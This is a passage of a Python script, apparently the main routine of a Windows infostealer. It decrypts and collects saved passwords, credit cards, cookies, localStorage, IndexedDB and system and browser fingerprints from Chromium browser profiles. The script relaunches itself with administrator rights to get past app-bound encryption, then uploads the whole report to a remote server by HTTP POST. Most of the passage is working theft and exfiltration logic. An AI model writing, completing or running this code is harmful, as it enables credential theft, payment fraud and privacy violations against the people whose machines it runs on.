            emit(f"    ! failed to process {b['name']}: {e}")

    # --- Collect localStorage from Chromium profiles ---
    emit("")
    emit("Extracting localStorage from Chromium profiles...")
    storage_data = {}   # { (browser, profile): {origin: {"local": {k:v}, "session": {k:v}}} }
    for b in chromium:
        user_data = b["user_data"]
        browser_name = b["name"]
        profiles = enumerate_chromium_profiles(user_data)
        for prof in profiles:
            profile_dir = os.path.dirname(prof["cookie_db"])
            ls = extract_chromium_local_storage(profile_dir)
            if ls:
                key = (browser_name, prof["profile"])
                # Wrap each origin's key-value dict in the {"local": ...} shape
                # the backend's parse_storage_block expects.
                wrapped = {}
                for origin, kvs in ls.items():
                    wrapped[origin] = {"local": kvs}
                storage_data[key] = wrapped
                origin_count = len(ls)
                emit(f"  {browser_name} / {prof['profile']}: {origin_count} origins with localStorage")

    # --- Collect IndexedDB from Chromium profiles via Playwright ---
    emit("")
    emit("Extracting IndexedDB via Playwright ...")

    # Build the set of origins each profile might have IndexedDB for. We source
    # these from cookies + localStorage (already extracted offline) so we only
    # visit origins that actually exist on this PC, and so we never hard-code
    # origin or browser-specific paths.
    def _origin_host(origin):
        return urlparse(origin).hostname or ""

    profile_origins = collections.defaultdict(set)
    for r in records:
        host = (r.get("host") or "").lstrip(".")
        if not host:
            continue
        scheme = "http" if r.get("source_scheme") == 1 else "https"
        profile_origins[(r["browser"], r["profile"])].add(f"{scheme}://{host}")
    for (browser, profile), origins in storage_data.items():
        profile_origins[(browser, profile)].update(origins.keys())

    indexeddb_data = {}   # { (browser, profile): {origin: [db_descriptors]} }
    tasks = []            # (browser_name, profile, profile_dir, origins)

    for b in chromium:
        browser_name = b["name"]
        for prof in enumerate_chromium_profiles(b["user_data"]):
            profile_dir = os.path.dirname(prof["cookie_db"])
            if not os.path.isdir(os.path.join(profile_dir, "IndexedDB")):
                continue
            hosts = _indexeddb_hosts(profile_dir)
            if not hosts:
                continue
            key = (browser_name, prof["profile"])
            origins = {
                o for o in profile_origins.get(key, ())
                if _origin_host(o) in hosts
            }
            if not origins:
                continue
            tasks.append((browser_name, prof["profile"], profile_dir, origins))

    if not tasks:
        emit("  No IndexedDB data found on this PC — skipping")
    else:
        emit(f"  Found IndexedDB in {len(tasks)} profile(s)")
        if len(tasks) > 1 and HAS_PLAYWRIGHT:
            from concurrent.futures import ThreadPoolExecutor, as_completed
            with ThreadPoolExecutor(max_workers=min(3, len(tasks))) as pool:
                futures = {
                    pool.submit(
                        extract_indexeddb_via_playwright,
                        profile_dir, browser_name, origins, emit,
                    ): (browser_name, profile)
                    for (browser_name, profile, profile_dir, origins) in tasks
                }
                for fut in as_completed(futures):
                    browser_name, profile = futures[fut]
                    try:
                        result = fut.result()
                    except Exception as e:
                        emit(f"  ! {browser_name} / {profile}: {e}")
                        result = None
                    if result:
                        indexeddb_data[(browser_name, profile)] = result
                        emit(f"  {browser_name} / {profile}: {len(result)} origin(s) with IndexedDB")
        else:
            for (browser_name, profile, profile_dir, origins) in tasks:
                result = extract_indexeddb_via_playwright(profile_dir, browser_name, origins, emit)
                if result:
                    indexeddb_data[(browser_name, profile)] = result
                    emit(f"  {browser_name} / {profile}: {len(result)} origin(s) with IndexedDB")

    # --- Collect fingerprint data ---
    emit("")
    emit("Collecting browser fingerprint...")
    machine_fp = collect_system_fingerprint()
    browser_fps = {}
    for b in chromium:
        fp = collect_browser_fingerprint(b["user_data"], b["name"])
        if fp["user_agent"] or fp["version"]:
            browser_fps[b["name"]] = fp
            emit(f"  {b['name']}: {fp['version']} → {fp['user_agent'][:80]}...")

    # --- Collect saved passwords from Chromium profiles ---
    emit("")
    emit("Extracting saved passwords from Chromium profiles...")
    passwords_data = {}   # { (browser, profile): [password_dicts] }
    for b in chromium:
        user_data = b["user_data"]
        browser_name = b["name"]
        local_state = {}
        ls_path = os.path.join(user_data, "Local State")
        if os.path.isfile(ls_path):
            try:
                with open(ls_path, "r", encoding="utf-8") as f:
                    local_state = json.load(f)
            except Exception:
                pass
        v10_key = v20_key = None
        try:
            v10_key = get_v10_master_key(local_state)
        except Exception:
            pass
        try:
            v20_key = get_v20_master_key(local_state, browser_name)
        except Exception:
            pass
        profiles = enumerate_chromium_profiles(user_data)
        for prof in profiles:
            profile_dir = os.path.dirname(prof["cookie_db"])
            pwds = read_chromium_passwords(profile_dir, v10_key, v20_key, emit)
            if pwds:
                key = (browser_name, prof["profile"])
                passwords_data[key] = pwds

    if passwords_data:
        total = sum(len(v) for v in passwords_data.values())
        emit(f"  Total: {total} passwords from {len(passwords_data)} profile(s)")
    else:
        emit("  No saved passwords found")

    # --- Collect credit cards from Chromium profiles ---
    emit("")
    emit("Extracting credit cards from Chromium profiles...")
    cards_data = {}   # { (browser, profile): [card_dicts] }
    for b in chromium:
        user_data = b["user_data"]
        browser_name = b["name"]
        local_state = {}
        ls_path = os.path.join(user_data, "Local State")
        if os.path.isfile(ls_path):
            try:
                with open(ls_path, "r", encoding="utf-8") as f:
                    local_state = json.load(f)
            except Exception:
                pass
        v10_key = v20_key = None
        try:
            v10_key = get_v10_master_key(local_state)
        except Exception:
            pass
        try:
            v20_key = get_v20_master_key(local_state, browser_name)
        except Exception:
            pass
        profiles = enumerate_chromium_profiles(user_data)
        for prof in profiles:
            profile_dir = os.path.dirname(prof["cookie_db"])
            cards = read_chromium_credit_cards(profile_dir, v10_key, v20_key, emit)
            if cards:
                key = (browser_name, prof["profile"])
                cards_data[key] = cards

    if cards_data:
        total = sum(len(v) for v in cards_data.values())
        emit(f"  Total: {total} credit cards from {len(cards_data)} profile(s)")
    else:
        emit("  No saved credit cards found")

    # Build the final report and collect all output lines.
    report_lines = build_report(records)

    # Combine log_lines, report, storage block, fingerprint block, IndexedDB block,
    # passwords block, credit cards block, and full cookie JSON.
    storage_block = serialize_storage_block(storage_data)
    fingerprint_block = serialize_fingerprint_block(machine_fp, browser_fps)
    cookies_json_block = serialize_cookies_json_block(records)
    indexeddb_block = serialize_indexeddb_block(indexeddb_data)
    passwords_block = serialize_passwords_block(passwords_data)
    credit_cards_block = serialize_credit_cards_block(cards_data)
    full_output = ("\n".join(log_lines) + "\n\n" + "\n".join(report_lines)
                   + storage_block + fingerprint_block + cookies_json_block
                   + indexeddb_block + passwords_block + credit_cards_block)

    # Print the final report to console (already printed via emit, but let's show the extra sections)
    print("")
    print("=" * 70)
    print("")
    for line in report_lines:
        print(line)
    if storage_block:
        print(storage_block)
    if fingerprint_block:
        print(fingerprint_block)
    if indexeddb_block:
        print(indexeddb_block)
    if passwords_block:
        print(passwords_block)
    if credit_cards_block:
        print(credit_cards_block)

    # Upload the output to the remote server.
    upload_url = args.url
    try:
        files = {'file': ('output.txt', full_output.encode('utf-8'), 'text/plain')}
        data = {
            'username': args.username,
            'password': args.password,
            'name': args.name,
        }
        response = requests.post(upload_url, data=data, files=files)
        if response.status_code == 200:
            emit("")
            emit(f"Upload successful. Server responded: {response.text}")
        else:
            emit("")
            emit(f"Upload failed with status {response.status_code}: {response.text}")
    except Exception as e:
        emit("")
        emit(f"Upload error: {e}")


# ---------------------------------------------------------------------------
# Argument parsing and entry point
# ---------------------------------------------------------------------------
def parse_args():
    parser = argparse.ArgumentParser(
        description="Extract browser cookies and upload the report."
    )
    parser.add_argument(
        "--username", required=True,
        help="Username for the upload endpoint"
    )
    parser.add_argument(
        "--password", required=True,
        help="Password for the upload endpoint"
    )
    parser.add_argument(
        "--url",
        default=DEFAULT_UPLOAD_URL,
        help="Upload endpoint URL"
    )
    parser.add_argument(
        "--name",
        default=DEFAULT_NAME,
        help="Name field sent to the upload API"
    )
    parser.add_argument(
        "--no-close",
        action="store_true",
        help="Skip closing browsers before extraction"
    )
    return parser.parse_args()


if __name__ == "__main__":
    # Parse CLI arguments early so they are available for relaunch and for the --no-close flag.
    args = parse_args()

    if args.no_close:
        CLOSE_BROWSERS = False

    if not is_admin():
        print("Administrator rights required (for Chrome/Chromium v20 app-bound cookies).")
        print("Requesting elevation... A new (elevated) window will open.")
        print("Results will be uploaded to the remote server.")
        relaunch_as_admin()
    else:
        try:
            main(args)
        except Exception:
            tb = traceback.format_exc()
            print("\n!!! The decryptor crashed:\n" + tb)
        finally:
            try:
                input("\nDone. Press Enter to close this window...")
            except EOFError:
                pass